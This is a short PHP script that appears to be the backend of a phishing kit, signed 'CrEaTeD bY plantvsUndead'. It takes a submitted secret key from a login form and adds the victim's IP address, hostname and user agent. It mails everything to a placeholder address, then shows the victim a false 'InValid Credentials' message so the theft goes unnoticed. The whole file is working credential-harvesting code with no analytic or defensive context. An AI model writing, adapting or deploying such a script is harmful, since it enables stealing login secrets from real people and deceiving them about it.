<?php
$email = trim($_POST['pass']);
//$password = trim($_POST['password']);
//$detail = trim($_POST['detail']);
if($email != null){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
    $message = "";
	$message .= "|----------| xLs |--------------|\n";
	$message .= "Login From           : "/*.$detail*/."\n";
	$message .= "SecretKey            : ".$email."\n";
	//$message .= "Passcode              : ".$password."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY plantvsUndead --------------|\n";
	$send = "emailisgonnabehere";
	$subject = "Login : $ip";
    mail($send, $subject, $message);   
	$signal = 'ok';
	$msg = 'InValid Credentials';
	
	// $praga=rand();
	// $praga=md5($praga);
}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg
    );
    echo json_encode($data);

?>